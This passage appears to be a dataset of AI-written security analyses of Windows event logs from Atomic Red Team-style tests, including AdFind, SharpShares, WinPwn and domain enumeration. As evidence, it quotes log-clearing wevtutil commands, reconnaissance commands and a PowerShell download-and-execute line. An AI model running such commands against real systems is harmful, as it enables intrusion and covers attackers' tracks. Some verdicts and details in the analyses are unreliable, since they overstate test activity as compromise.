Overall, the combination of cleared logs and command execution associated with reconnaissance points towards suspicious behavior that is beyond typical administrative tasks. While specific evidence of data compromise or a damaging payload is not immediately apparent in these logs, the tactics observed are consistent with malicious intent.

### Resolution:
Given the evidence of log clearing, command execution, and potential reconnaissance activities, the activity within these logs should be classified as:

**MALICIOUS**

### Guidance on How to Proceed:
1. **Immediate Investigation:**
   - Conduct a thorough investigation for other indications of compromise on `Server002` and other systems with which it might have communicated or shared credentials.
   
2. **Review Admin Accounts:**
   - Immediately review the activities and permissions of the account `admin_test`. Consider resetting credentials and applying stricter access controls.

3. **Enhanced Monitoring:**
   - Increase logging and monitoring on potential lateral movement paths and ensure all security controls (e.g., EDR, SIEM) are actively alerting on similar suspicious command executions and log management utilities.

4. **Forensic Analysis:**
   - If possible, perform forensic analysis on `Server002` to identify if there are any artifacts left by attackers, such as scripts, malware, or unauthorized access tools.

5. **Remediation & Prevention:**
   - Follow through with remediation strategies such as applying patches, updating security policies, conducting a thorough compromise assessment, and informing relevant stakeholders about the security incident.

In conclusion, while no definitive payload or direct evidence of data exfiltration is noted, the actions taken on the host are decidedly aligned with malicious tactics. It's crucial to act on these findings promptly to mitigate any potential further risk or intrusion attempts."
List Google Chrome - Opera Bookmarks on Windows with powershell,"Upon reviewing the provided Windows event logs, here is my assessment and analysis:

1. **Unusual Use of PowerShell**: 
   - There is an instance where PowerShell is executed with a command to list items recursively in user directories, specifically filtering for ""Bookmarks"". This is noted in the Sysmon and PowerShell logs:
     - The PowerShell command: `""powershell.exe"" & {Get-ChildItem -Path C:\\Users\\ -Filter Bookmarks -Recurse -ErrorAction SilentlyContinue -Force}`
   - The command appears to be used to recursively search for bookmark files across user directories and it was executed under `SERVER002\admin_test` with high integrity level. This behavior is suspicious as it indicates potential data gathering or reconnaissance activity.

2. **Clearing of Event Logs**:
   - The security log indicates event log clearing actions. The `EventID 1102` in the security log is associated with the clearing of the event log by the user `admin_test`:
     - The presence of event log clearing is a common tactic employed by malicious actors attempting to cover their tracks.

3. **Wevtutil Usage**:
   - There are several occurrences where `wevtutil.exe` is utilized to clear different Windows Event Logs (System, Security, Windows PowerShell):
     - Commands to clear event logs (`cl`) suggest deliberate log tampering and are a strong indication of malicious behavior.

4. **Common Microsoft Process Execution**:
   - Several common Microsoft processes such as `hostname.exe`, `conhost.exe`, and `wevtutil.exe` executed within short intervals. Although these processes are legitimate, the context of their execution (especially `wevtutil.exe`) raises concerns when analyzed alongside log clearance activities.

5. **User Context and Privilege**:
   - The actions are performed under the `admin_test` user context with high integrity level. The user is seen executing several commands that potentially modify system logs and security settings, indicative of privilege abuse.

**Assessment**:
The set of activities observed in the logs indicate that someone with administrative privileges (`admin_test`) executed a sequence of operations that include suspicious PowerShell activity, followed by clearing event logs, which points towards efforts to delete evidence of actions taken on the system. This chain of activities aligns with known malicious behavior patterns, especially attempts to gather information and hide traces.

**Guidance for Resolution**:
- **Resolution**: MALICIOUS
- **Actionable Steps**: 
  - Immediately isolate the affected system to prevent further potential unauthorized access.
  - Conduct a comprehensive forensic investigation to determine the scope of potential data breach or compromise.
  - Review user access logs and privileges assigned to `admin_test` and consider resetting credentials for affected accounts.
  - Reassess security controls, especially monitoring and alerting mechanisms, to detect and respond to similar incidents in the future.
  - Reinforce user training on recognizing and preventing security breaches.

This assessment is guided by the path of activity typical of attempts to obfuscate potentially harmful operations performed on a system. Given the determined malicious nature, prompt action is necessary to mitigate risks and understand the full impact of the incident."
Adfind -Listing password policy,"Based on the provided event logs, several aspects of activity raise concerns regarding potential malicious behavior:

1. **Log Clearance Events**:
    - The `wevtutil.exe` command-line utility is observed to have been used to clear event logs with commands such as `wevtutil.exe cl System`, `wevtutil.exe cl Security`, `wevtutil.exe cl ""Windows PowerShell""`, and `wevtutil.exe cl Application`.
    - Event log clearance, especially in a focused and rapid succession across multiple log categories, is a hallmark of an attempt to cover tracks and indicates potentially malicious intent.

2. **Usage of `wevtutil.exe`**:
    - The repeated execution of `wevtutil.exe` under the `admin_test` user context with high integrity levels is indicative of suspicious activity usually associated with attempts to clean system traces. The `wevtutil` tool is widely recognized as a utility that attackers use to delete evidence of their activities.

3. **Execution of AdFind**:
    - The process `cmd.exe` executing the command line that involves `AtomicRedTeam` and `AdFind.exe` suggests the use of a known security testing framework, Atomic Red Team, and AdFind, which is often employed for reconnaissance, especially in Active Directory environments. Such activity is typically associated with penetration testing, red team exercises, or potentially malicious reconnaissance by attackers.

4. **Security Log Clearance**:
    - Event ID '1102' indicates that the security log was cleared, which is typically a rare event in regular operations and strongly suggests an effort to hide unauthorized or malicious activities.

5. **Privileged Tokens and Elevated Tokens**:
    - The logs indicate the assignment of various privileges that could be indicative of an escalation of privileges within the system, including `SeDebugPrivilege`, among others.

6. **Processes Executed as SYSTEM**:
    - Many processes, including Edge Update processes and log clearing activities, are executed under the `NT AUTHORITY\SYSTEM` account, which is significant as it indicates actions performed with the highest level of privileges available on the host.

In summary, the presence of multiple log clearance events using `wevtutil.exe`, along with potentially reconnaissance-related activity involving `AtomicRedTeam` and `AdFind.exe`, strongly suggests malicious intent. These events align with tactics commonly used by attackers to gain information and cover their tracks post-compromise.

**Resolution: MALICIOUS**

**Guidance**:
- Immediate containment and isolation of the affected host (Server002) should be initiated to prevent further lateral movement or data exfiltration.
- Comprehensive forensic analysis should be conducted to determine the extent of the breach, including memory analysis and network flow monitoring.
- Review other systems and network devices for similar indicators of compromise.

"
Enumerate All Network Shares with SharpShares,"Based on the analysis of the provided logs, several indicators of potentially malicious activity have been identified:

1. **PowerShell Execution**: A PowerShell process (`powershell.exe`) is seen executing with a command that involves `SharpShares.exe` from the `AtomicRedTeam` directory. This behavior is indicative of a technique used by the Atomic Red Team framework for adversary simulation, which often reflects actions that real attackers might attempt, like privilege escalation and lateral movement.

   - **CommandLine**: `powershell.exe & {cmd /c 'C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\..\\ExternalPayloads\\SharpShares.exe' /ldap:all | out-file -filepath \""$env:temp\\T1135SharpSharesOutput.txt\""}`
   
   This command is executed possibly to enumerate shares or gather data about accessible shares using LDAP queries, which is a common reconnaissance technique.

2. **Event Log Clearing**: The logs show several instances of the `wevtutil.exe` tool being used to clear key event logs such as the Sysmon, Application, Security, and Windows PowerShell logs. Clearing event logs is a common method used by attackers to cover their tracks.

3. **Security Log Cleared**: The Security log shows an event (Event ID 1102) indicating the security log was cleared. Clearing security logs can only be performed with administrative privileges and is a key indicator of an attempt to remove traces of malicious activity.

4. **User Account**: All suspicious activities were executed under the `SERVER002\\admin_test` account. The use of an administrative account to execute potential malicious commands is concerning and suggests either misuse or compromise of this account.

5. **Execution of Suspicious Tools**: The execution of `SharpShares.exe`, a recognized tool used for security assessments and potentially malicious operations, suggests that someone might be running offensive security tools on the CEO’s machine.

Given these observations, the logs contain activities that are highly indicative of compromise or malicious intent:

- The use of PowerShell to execute commands reflects a common method attackers use to execute arbitrary code.
- Clearing logs suggests an attempt to avoid detection.
- The execution of a known offensive security tool is suspicious without legitimate justification.

Process Discovery - Process Hacker,"Upon analyzing the provided Windows event logs, here are the key observations:

1. **Suspicious PowerShell Activity**:
   - There are multiple PowerShell logs with the command: `powershell.exe & {Start-Process -FilePath ""$Env:ProgramFiles\\Process Hacker 2\\ProcessHacker.exe""}` (Event IDs 1066-1072).
   - ""Process Hacker"" is a tool often used for debugging and system exploration but can be misused for malicious purposes, such as viewing and modifying the processes in memory.
   - The use of PowerShell with Process Hacker may indicate an attempt to execute processes with elevated privileges or to camouflage malicious actions.

2. **Event Logs Cleared**:
   - System and PowerShell event logs were cleared by the user ""admin_test"". This is evident from System Event IDs 3571 and 3572 and Security Event ID 1102.
   - Clearing logs is a common tactic used by attackers to cover their tracks post-compromise.

3. **Sysmon Logs Indicating Wevtutil Usage**:
   - Multiple instances of `wevtutil.exe cl` were executed, clearing logs such as Microsoft-Windows-Sysmon/Operational, Application, and Security (Observed in Event IDs 17967, 17971, 17975, 17979, 17983).
   - The `wevtutil.exe` command is being used to clear event logs, aligning with the previous finding of log clearing activities. This is a strong indicator of potential malicious activity.

4. **Process Execution Observations**:
   - The user ""SERVER002\\admin_test"" has executed multiple processes indicative of reconnaissance activities, including execution of `whoami.exe`, `hostname.exe`, and SecureBoot related executables.
   - This suggests that the user might be performing activities to gather system information or check privileges.

**Assessment and Resolution**:
The activity recorded in the logs exhibits several indicators of compromise:
- The use of PowerShell with a known tool like Process Hacker is suspicious.
- The log clearing activity suggests an attempt to hide actions on the system.
- The execution of potential reconnaissance commands under an administrative context.

Based on these observations, the behavior is classified as **MALICIOUS**. Immediate steps should be taken to isolate the affected host, conduct a full forensic analysis, and review related hosts or domain accounts that may have been affected.

**Guidance on How to Proceed**:

Network Share Discovery PowerShell,"Upon reviewing the provided Windows event logs, there are several indicators that warrant closer scrutiny due to their potential for indicating malicious behavior:

1. **Log Clearing Activity:**
   - Multiple logs have been cleared (System, PowerShell, Security) by the user `admin_test`. This can be indicative of an attempt to cover up activity, as it obscures what actions were taken before the log clearing occurred. Event logs are typically not cleared in usual operations, especially across multiple channels, unless for legitimate administrative reasons which should be verified.

2. **Suspicious PowerShell Invocation:**
   - The PowerShell command `get-smbshare` was executed. While this particular command itself can be benign, if run in conjunction with other suspicious activities or by a user who typically wouldn't use such an advanced command, it could imply intent to identify accessible SMB shares on the network as a precursor to lateral movement.

3. **Use of `wevtutil.exe` for Log Clearing:** 
   - There are multiple Sysmon entries showing the use of `wevtutil.exe` to clear logs, specifically targeting the `Microsoft-Windows-Sysmon/Operational` log. This behavior is typically associated with threat actors attempting to hide their tracks, as `wevtutil` is a known tool used in forensic evasion.

4. **Edge Update Executions:**
   - Several processes related to Microsoft Edge Update have executed, including both the service start and other processes such as `MicrosoftEdgeUpdateComRegisterShell64.exe`. While these can be regular update activities, they occur synchronously with the log clearing events, which is peculiar and warrants correlation with known update schedules and observed user activity patterns to rule out suspicious intent or manipulation.

5. **Unusual Execution Patterns:**
   - There are several executions of command-line utilities like `whoami.exe` and `hostname.exe`, which in isolation can be benign. However, if used atypically or by a non-admin user, they can be used to gather system information, further aiding in reconnaissance.

### Assessment and Recommendations:

Based on the analysis, the detected activities are classified as **SUSPICIOUS** due to the combination of:
- Unauthorized log clearing attempts.
- The coordinated timing of different utilities that suggest potential reconnaissance or preparation for further exploitation.
- Tools and commands that, while potentially legitimate individually, collectively suggest operational security measures (OPSEC) alignment often used by threat actors.

### Recommended Actions:

1. **Immediate Inspection:**
   - Verify if the log clearing has been documented and approved by administrative policy. If not, it should be considered unauthorized and further investigation should be conducted on the `admin_test` user account, including communication with the account holder if legitimate.

2. **System Integrity Checks:**
   - Review the integrity of system files and installed applications to identify unauthorized changes. Utilize tools to baseline system integrity and compare recent changes.

3. **Network Analysis:**
   - Monitor network traffic for unusual outbound connections or data transfers that may indicate exfiltration attempts or command-and-control (C2) communications.

4. **Enhance Monitoring:**
   - Increase logging verbosity and retention times. Implement alerting for future log clear attempts or suspicious PowerShell executions and cross-reference those alerts with known threat patterns.

5. **User Awareness and Training:**
   - If `admin_test` is a legitimate user, provide training on best security practices and potential misuse of administrative tools without proper oversight.

Further investigation is needed to verify these anomalies and address any potential compromises they may represent."
WinPwn - RBCD-Check,"Upon review of the provided Windows event logs, there are several indications of suspicious behavior that warrant further investigation:

1. **Execution of PowerShell Script**: 
   - Multiple events in the Sysmon and Windows PowerShell logs indicate the execution of a PowerShell script from an external source (GitHub). The command executed appears to be downloading and executing a PowerShell script (`WinPwn.ps1`). This behavior is suspicious, as it involves executing a script from a potentially untrusted external source, which could indicate malicious intent or post-exploitation activity.

2. **Clearing of Event Logs**:
   - The Windows event logs for System, Security, and PowerShell channels were cleared. This is significant as it might indicate an attempt to cover tracks after suspicious activity. Event ID 104 and 1102 indicate that the logs were cleared by a user with administrative privileges, `admin_test`. The clearing of logs is a common method used by attackers to avoid detection after compromise or malicious activity has occurred.

3. **Use of High-Integrity Level Processes**:
   - There is high-integrity level execution of processes such as `whoami.exe`, `conhost.exe`, `wevtutil.exe`, and others under the `SERVER002\admin_test` account. Though not inherently malicious, the context of these executions alongside the clearing of logs and suspicious PowerShell activity could suggest elevation of privileges or an unauthorized user masquerading as an administrator.

4. **Privilege Escalation Evidence**:
   - Security Event 4672 shows that the `admin_test` account has been granted special privileges, including `SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, and `SeBackupPrivilege`, among others. These privileges can be abused by adversaries to gain a greater control over the system, indicative of privilege escalation techniques.

5. **Network and Remote Activity**:
   - The logs show use of the `NtLmSsp` logon process with NTLM authentication, which might suggest lateral movement or unauthorized remote access, especially when combined with the suspicious PowerShell activities.

Based on the analysis above, the situation can be considered **MALICIOUS** due to:

- Execution of potentially harmful PowerShell script from an external source.
- Clearing of critical event logs, suggesting intentional track-covering actions.
- High integrity level and privilege usage suggesting potential unauthorized access and privilege escalation.

**Recommendations for Action**:
- Immediately isolate the affected system from the network to prevent further malicious activity or spread.
- Conduct a thorough forensic investigation of the affected system to understand the extent of the compromise.
- Reset all potentially compromised accounts, especially `admin_test`, and investigate any anomalous logins.
- Review and enhance logging and monitoring mechanisms to detect similar threat patterns in the future.
- Educate the staff about the risks of executing scripts from untrusted external sources and reinforce security protocols."
Remote System Discovery - net,"Based on the analysis of the provided logs, the following observations have been made:

### Summary of Findings:

1. **Log Clearing Actions:**
   - The logs indicate that several event logs (System, Windows PowerShell, and Security) were cleared by a user named `admin_test`. This is marked by the events with EventID 104 in the System log and EventID 1102 in the Security log.
   - Clearing event logs is a significant action typically associated with malicious activities, particularly to cover tracks after or during a cyber attack.

2. **Suspicious Processes and Commands:**
   - Command-line tools such as `wevtutil` have been used to clear logs. This tool is legitimate but can be used maliciously to clear logs, as seen here.
   - The execution of `cmd.exe` with commands such as `net view /domain & net view` suggests a reconnaissance phase, potentially looking for network information or shared resources.
   - Execution of `whoami.exe` and `hostname.exe` can be indicative of gathering information about the current user and machine details, which is common during the initial phases of an attack.

3. **Admin Privileges and Logins:**
   - There are several instances of privilege escalation or attempts to use processes with elevated permissions between admin_test and SYSTEM accounts, observable through EventIDs such as 4672 (special privilege assigned to a user) and 4624 (successful logon).

4. **Time Manipulation:**
   - There are events related to time changes on the system clocks, as indicated by EventID 4616. Although this could be benign, time changes can sometimes indicate manipulation attempts in an attack context.

5. **Other System Activities:**
   - Routine Microsoft Defender Antivirus updates were noted, which appear benign.
   - Microsoft Edge and Windows Update activities appear routine and illustrate typical system maintenance and updates.

### Assessment:

Based on the specific actions of log deletion and potential reconnaissance activities, there is sufficient evidence to classify the activities within these logs as **SUSPICIOUS**. The clearing of event logs by an admin user without clear, legitimate justification, combined with network reconnaissance activities, signals potential malicious intent. 

### Guidance:

- **Investigation and Monitoring:** Immediate further investigation is recommended to determine the context and intent behind the log clearing actions. Monitor the activities of the `admin_test` user account closely and secure logs to prevent further deletion.
- **Review Privileges:** Check if the `admin_test` account has justifiable reasons to possess high privileges and ensure account credentials have not been compromised.
- **Strengthen Logging:** Ensure robust logging policies are in place and consider forwarding logs to a secure, remote server where they cannot be easily manipulated.
- **Isolation and Forensics:** If feasible, isolate the machine for further forensic analysis to understand the full scope of actions performed.

This initial assessment and guidance underscore the need for a timely and thorough investigation to either confirm malicious activity or rule it out, ensuring critical security postures are maintained at all times."

MSFT Get-GPO Cmdlet,"Upon analyzing the provided Windows event logs, the following anomalous behavior and potential indicators of malicious activity were observed:

1. **Multiple Event Log Clearing:** 
   - The `wevtutil.exe` utility is used multiple times by the user `SERVER002\admin_test` to clear logs from various channels: Sysmon, Application, System, and Security. The sequence of events suggests an attempt to cover tracks, as clearing logs is a common behavior of attackers post-compromise to evade detection.

2. **Suspicious PowerShell Activity:**
   - Execution of `powershell.exe` with commands that involve `Get-GPO` indicates possible reconnaissance activity aimed at retrieving Group Policy Objects from the domain. This can be considered suspicious as it often precedes lateral movement or privilege escalation attempts.

3. **Usage of `whoami.exe` and `hostname.exe`:**
   - The usage of these executables by `SERVER002\admin_test` without clear context might be a benign activity; however, it can also be associated with gathering system information or verifying access, which is often automated in malicious scripts.

4. **Temp Directory Usage and Unusual Execution Paths:**
   - The execution of `DismHost.exe` from a temp directory (`C:\Users\ADMIN_~1\AppData\Local\Temp\D48C763E-E865-4B4D-ACE5-1BD1680CCD71`) is unusual, as it is typically used from system directories. This could indicate a potentially malicious or unauthorized installation or tampering with a legitimate process.

5. **Clearing of Security logs:**
   - Event ID 1102 from the Security log indicates the clearing of security logs by `admin_test`. This action enhances the suspicion of an attempt to hide malicious activities.

6. **High Integrity Level Processes:**
   - Several processes like `wevtutil.exe` and `powershell.exe` are executed with high integrity levels, indicating they have elevated privileges which, if misused, can facilitate a range of malicious activities including log clearing and system changes.

**Assessment:**
Based on the identified behaviors — particularly the clearing of logs, suspicious PowerShell usage, and processes with elevated privileges — the events strongly suggest signs of malicious activity. These indicators, in combination, can imply either an internal threat or compromised credentials used for malicious purposes.

**Resolution: MALICIOUS**

**Guidance on How to Proceed:**
- Immediately isolate the affected host to prevent further potentially malicious activities.
- Conduct a thorough forensic investigation to determine the scope of the compromise, identify the initial infection vector, and assess any potential data exfiltration.

Enumerate Windows Security Log via WevtUtil,"### Detailed Analysis of Logs

Upon analysis of the provided log entries from the Security, System, Sysmon, and Application logs, the following points stand out:

1. **Event Log Clearance**:
   - Multiple entries indicate the clearance of event logs (`EventID: 1102` in Security logs and `EventID: 104` in System logs). This action, especially performed using `wevtutil.exe`, is often associated with attempts to cover tracks of illicit activities.
   - User `admin_test` cleared logs across Security, System, and PowerShell channels almost simultaneously, which is highly suspicious and uncommon under normal circumstances unless coordinated for legitimate maintenance with corresponding documentation and approvals.

2. **Privilege Escalation**:
   - There are entries indicating a privileged logon by user `admin_test` with significant special privileges including `SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, etc. (EventID: 4672). These privileges allow broad control over a Windows system and are not typically required for everyday administrative tasks.
   - The logon via `NTLM`, Type 3 (network), suggests remote access to the system, from a workstation (`DESKTOP-3HL5B2P`), which should be verified for legitimacy.

3. **Time Manipulation**:
   - The time change events (`EventID: 4616`, `EventID: 24` from the System log) indicate modification to the system clock. Such actions can be an attempt to manipulate timestamps for forensic evasion.

4. **Execution of Administrative Tools**:
   - Entry of `wevtutil` command-line execution is confirmed via Sysmon logs. This command is typically used to clear logs or query event log channels and was done using high integrity, further supporting potential foul play.
   - Command-line actions were directed towards event log operation (Sysmon `EventID: 1`, indicating `wevtutil.exe` execution).

5. **Normal System Updates**:
   - Activities related to Microsoft Edge updates (as seen from Sysmon events illustrating `MicrosoftEdgeUpdate.exe`) seem legitimate as they involve standard update operations by `NT AUTHORITY\SYSTEM`.

### Assessment

Considering the above points, the actions of clearing logs, high-level privilege usage, and time manipulation strongly depict potential malicious behavior designed to obscure activities and manipulate log trails after accessing elevated privileges on the host. The normal system and update operations serve as a backdrop for these suspicious activities.

### Threats or Risks Identified

The primary risks identified include unauthorized access, potential data exfiltration, and system compromise. The event log clearance is particularly concerning as it signifies an attempt to remove evidence of the activities conducted on the system.

### Guidance on How to Proceed

1. **Immediate Isolation**: Isolate the system (SERVER002) from the network to prevent further malicious actions and analyze potential data exfiltration routes.
2. **Detailed Audit and Monitoring**: Perform a comprehensive audit of accounts and logon sessions, especially for `admin_test`, and cross-check any associated activities with authorized changes or tasks.
3. **Restore System Logs**: Attempt to restore the cleared logs from backup if available to review any prior activity potentially captured.
4. **Security Review**: Conduct a security review of the affected user account settings and password policies, as well as validate network connections from the specified workstation.
5. **Incident Response**: Engage the incident response team to further analyze and investigate potential lateral movement and prevalence within the network.

### Final Resolution

- **MALICIOUS**: The patterns of log clearance, privilege escalation, and time manipulation are indicative of a concerted attempt to cover illicit activities on the system. Immediate action and detailed investigation are required."
Enumerate domain computers within Active Directory using DirectorySearcher,"Upon analyzing the provided Windows event logs, the following observations and assessments can be made:

1. **Log File Clearing:**
   - Multiple instances of log files being cleared are noted:
     - System log file cleared by user ""admin_test"" at ""2024-10-21 09:52:35"".
     - PowerShell log file cleared by the same user almost immediately after.
     - Security log file cleared at ""2024-10-21 09:52:36"".
   - Log clearing activity is highly suspicious, especially when done in close succession, as it may indicate an attempt to hide illicit activities.

2. **PowerShell Activity:**
   - PowerShell execution with the command involving `System.DirectoryServices.DirectorySearcher` to list computer objects. This script appears to be performing some form of reconnaissance by gathering computer names in a network, which could be indicative of lateral movement preparation.

3. **Process Execution:**
   - Execution of `wevtutil.exe` with command lines indicating clearing of multiple logs (Sysmon, Application, Security, and System logs) by the user ""admin_test"". This reinforces the suspicious nature due to active attempts to remove traces of activity.

4. **Privilege Usage:**
   - An Event ID 4672 indicates special privileges were assigned to the ""SYSTEM"" account, which is typical for high privilege operations.

5. **Repeated Credential Retrieval Failures:**
   - Numerous Event ID 5379 entries with failed attempts to retrieve credentials for a Microsoft account. While this could be normal behavior if the configurations or network policies are misaligned, the sheer volume and timing are unusual and could suggest some form of attack or automated account probing.

6. **Normal Software Updates:**
   - Microsoft Defender Antivirus updates and Edge updates logged are typical, indicating normal system maintenance activity without any apparent signs of compromise related to software updates themselves.

**Assessment:**
- The combination of suspicious log-clearing activities, PowerShell script execution for network reconnaissance, and failed credential access attempts can be indicative of malicious activity. Log clearing, in particular, aligns with techniques used to obfuscate malicious behavior post-exploitation.

**Resolution:**
- **MALICIOUS:** The activities logged, specifically the clearing of logs and the reconnaissance via PowerShell, suggest malicious intent or compromise. It is advised to conduct further investigation into the involved user accounts, verify system integrity, and increase monitoring on ""Server002"". Immediate steps should include an examination of system integrity, validation of account activities, and prevention of potential lateral movement or data exfiltration. If possible, restoring to a known-good state prior to these events is recommended, along with a comprehensive security audit."
Suspicious LAPS Attributes Query with Get-ADComputer all properties and SearchScope,"**Analysis of Logs:**

The examination of the provided logs reveals several noteworthy elements of behavior that warrant further analysis. Let's dissect the key findings from each log to evaluate whether they are benign, suspicious, or malicious:

1. **Sysmon Log Analysis:**
   - A pattern of using `wevtutil.exe` with the 'cl' (clear log) command for various log channels (e.g., `Microsoft-Windows-Sysmon/Operational`, `Application`, `System`, `Security`, and `Windows PowerShell`). This is often a tactic used by an attacker to cover tracks by clearing event logs.
   - The sequential execution of `wevtutil.exe` followed by `conhost.exe` is also unusual without any legitimate administrative necessity or scheduled task, indicating possible malicious activity.
   - `PowerShell` execution with the command `{Get-adcomputer -SearchScope subtree -filter ""name -like '*'"" -Properties *}` is suspicious, as it implies enumeration of AD computer objects potentially for lateral movement or data gathering.

2. **Application Log Analysis:**
   - There is a log clear event for `Windows PowerShell`, which further supports attempts to obfuscate actions or cover traces.

3. **Windows PowerShell Log Analysis:**
   - Logs indicate PowerShell execution that aligns with the Sysmon findings. While the logs show standard provider state information, attempts to execute potentially malicious enumeration occur.

4. **Security Log Analysis:**
   - The entry shows the security event log being cleared, an action that is highly suspicious and usually an indicator of malicious activity when logs are cleared outside of legitimate administrative controls.

5. **System Log Analysis:**
   - Clearing system logs, like security logs, further indicates attempts to erase evidence of actions. 

**Assessment:**

- **Indicators of Malicious Activity:**
  - The use of `wevtutil.exe` to clear multiple event channels.
  - Execution of a PowerShell script that seems geared towards Active Directory reconnaissance or enumeration.
  - Multiple attempts at hiding activity through log clearing, which aligns with common tactics of system compromise and activity obfuscation.

Given the sequential nature of accessing these critical paths mostly through potentially compromised accounts, as well as the clearing of logs to cover tracks, these factors collectively indicate a deliberate and malicious attempt to compromise the system or prepare for further exploitation.

**Resolution:**
- **MALICIOUS**: The logs contain clear indicators of malicious activity, including covering tracks by clearing event logs and suspicious PowerShell usage that aligns with reconnaissance or lateral movement tactics.

**Guidance on How to Proceed:**
- Immediate steps should include isolating the affected system to prevent further spread or damage.
- Conduct a thorough forensic investigation to identify the extent of the compromise.
- Review and reinforce security policies and monitoring to prevent further incidents.
- Re-evaluating permissions and access controls, especially around administrative activities to prevent misuse.
- Notify appropriate organizational and, if required, legal entities about the compromise.
- Consider restoring affected systems from a known, safe backup after ensuring all threats have been neutralized."
Enumerate all accounts (Domain),"Based on the log analysis provided, I have identified several suspicious activities that indicate potential malicious behavior:

1. **Event Log Clearing**:
   - The Security Event Log has been cleared, as evidenced by the following log entry:
     - `Event ID: 1102` in the Security log shows that the logs were cleared by the user `admin_test` on `Server002`. This is commonly associated with attempts to cover tracks after potentially malicious activities.
   - Additionally, similar actions have been observed for the `System` and `Windows PowerShell` logs, as denoted by `Event ID: 104`. These logs were also cleared by the same user `admin_test`.

2. **Unusual Use of Command Utilities**:
   - Multiple instances of `wevtutil.exe` were used to clear event logs for various channels (such as `Microsoft-Windows-Sysmon/Operational`, `Application`, and `Security`). This tool is generally used legitimately for managing event logs but in this context of log clearing, it supports malicious intent.
   - Commands such as `cmd.exe /c net user /domain & net group /domain` indicate attempts to gather information about users and groups in the domain, possibly for reconnaissance purposes.

3. **Executed Processes with High Privileges**:
   - Processes like `whoami.exe`, `hostname.exe`, and various `net.exe` commands were executed with high integrity levels, suggesting they were run with administrative privileges by `admin_test`. The combination of these high-privilege commands with event log clearing further increases suspicion.

4. **Miscellaneous Activity**:
   - The logs show activities associated with the `Microsoft Edge Update` process and its installer. While such updates are often legitimate, their appearance in close sequence with the suspicious activity merits additional scrutiny, although they themselves do not directly indicate compromise.

**Assessment**:
The sequence and nature of events captured in these logs indicate attempts to elevate privileges, perform reconnaissance, and ultimately cover tracks by clearing event logs. These actions, performed by the `admin_test` account, are highly indicative of malicious behavior.

**Resolution**: MALICIOUS

**Guidance on Next Steps**:
- Immediately conduct a full investigation into the `admin_test` account to determine if it has been compromised.
- Examine other systems for similar patterns of behavior to assess if this is part of a wider compromise.
- Review access controls and audit logs for unusual activities leading to the current events.
- Consider enhancing monitoring and alerting on the use of process execution, particularly those associated with administrative tools and log clearing activities.
- Isolate affected systems if necessary, to prevent potential lateral movement and further compromise within the network."
WinPwn - fruit,"In analyzing the provided logs, several aspects stand out that indicate potentially malicious activity:

### Suspicious Behavior Identified

1. **PowerShell Execution with Suspicious Scripts**: 
   - There are multiple entries in the PowerShell logs showing execution of a PowerShell script from a GitHub repository (`WinPwn.ps1`). The script is being executed with the command `iex(new-object net.webclient).downloadstring(...)`, which is a common method used by attackers to download and execute malicious scripts from the internet.

2. **Clearing of Event Logs**:
   - The Sysmon, Security, and System logs indicate that event logs have been cleared, as shown by event IDs 1102 (Security log) and 104 (System log). Clearing logs is often a tactic used by malicious actors to cover their tracks on compromised systems.

3. **High Privilege Account Activity**:
   - There's an elevated privilege logon event (EventID 4672) for the user `admin_test`, granting high system privileges (`SeDebugPrivilege, SeBackupPrivilege, etc.`). While this could be legitimate, in the context of other suspicious activities, it raises concern.

4. **Process Execution**:
   - Multiple instances of `wevtutil.exe` execution, typically used to manage or clear event logs, align with the activity of log clearing noted above.
   - Various legitimate system binaries like `whoami.exe` and `hostname.exe` are being executed, potentially as reconnaissance activities typically conducted by threat actors after gaining initial access to gather environment information.

### Assessment

The sequence of clearing event logs, downloading and executing a potentially malicious PowerShell script, and using privileged accounts strongly indicates that the activities observed are not benign and align closely with known tactics of system compromise.

### Resolution

Given the clear indicators of potential malicious activity, this analysis results in a resolution of:

**MALICIOUS**

### Guidance on How to Proceed

1. **Immediate Isolation**: Isolate the affected host (Server002) from the network to prevent further spread or exfiltration of data.
   
2. **Forensic Investigation**: Conduct a full forensic investigation of the isolated system to understand the extent of the compromise, what data might have been accessed or exfiltrated, and the entry point of the attack.

3. **Review User Access**: Audit and review access logs, especially for high-privilege accounts like `admin_test`, to validate legitimate usage and detect any anomalies.

4. **Patch and Update Systems**: Ensure all systems, particularly those with internet-facing services, are up to date with patches to prevent exploitation of known vulnerabilities.

5. **Enhance Monitoring**: Implement or enhance monitoring and alerting on suspicious activities, such as unusual PowerShell usage and event log management commands.

6. **User Awareness and Training**: Strengthen the organization's security posture through user awareness and training, emphasizing the risks associated with executing unknown scripts and handling privileged accounts.

PowerShell Network Sniffing,"Here's a detailed analysis of the provided logs:

### Potential Indicators of Malicious Activity:

1. **Event Log Clearing**: 
   - The logs reveal usage of `wevtutil.exe` to clear event logs across multiple channels (Application, System, Security, Windows PowerShell). This is evident from the repeated execution of `C:\Windows\system32\wevtutil.exe cl ...` commands in the Sysmon logs. Wevtutil is a legitimate Windows utility but is frequently used by attackers to cover their tracks after activities such as privilege escalation and lateral movement.

2. **Privilege Usage**:
   - There is a security log event (4672) indicating that `admin_test` was granted a substantial number of privileges, including `SeDebugPrivilege`, `SeSecurityPrivilege`, and `SeBackupPrivilege`. These privileges can allow extensive system control and are potentially dangerous if used maliciously.

3. **Time Manipulation**:
   - Security logs (4616) indicate a suspicious time change event where the system time was set backward (`14:11:06` to `14:11:03`). While time changes can occur for legitimate reasons, they are also used by attackers to alter timestamps for evasive purposes.

4. **Suspicious PowerShell Activity**:
   - PowerShell logs indicate an execution of a network capture script, which may suggest reconnaissance or data exfiltration attempts. It runs commands such as `New-NetEventSession`, `Start-NetEventSession`, and `Stop-NetEventSession`. It finishes with `Remove-NetEventSession`, which indicates that a network event capture was likely conducted and then cleaned up. 

5. **Security Log Cleared**:
   - Security log 1102 indicates a log file clear event by `admin_test`. This user is repeatedly seen clearing logs, which is a strong indication of an attempt to cover malicious activities.

### Assessment:

The behavior observed in the logs matches patterns commonly associated with malicious activities, such as:
- Clearing event logs to cover tracks.
- Privileged command execution and altering system time.
- Suspicious PowerShell scripts that could potentially be used for network reconnaissance or data collection.

The combination of event log clearance, execution of PowerShell scripts, suspicious grant of high-level privileges, and apparent obfuscation activities strongly suggests malicious intent.

Find and Display Internet Explorer Browser Version,"### Detailed Log Analysis

#### Overview
The logs provided for analysis originate from Server002 and depict events primarily involving the usage of the `wevtutil.exe` utility for clearing event logs. Several processes were run under the `admin_test` account, which is known to have high privileges.

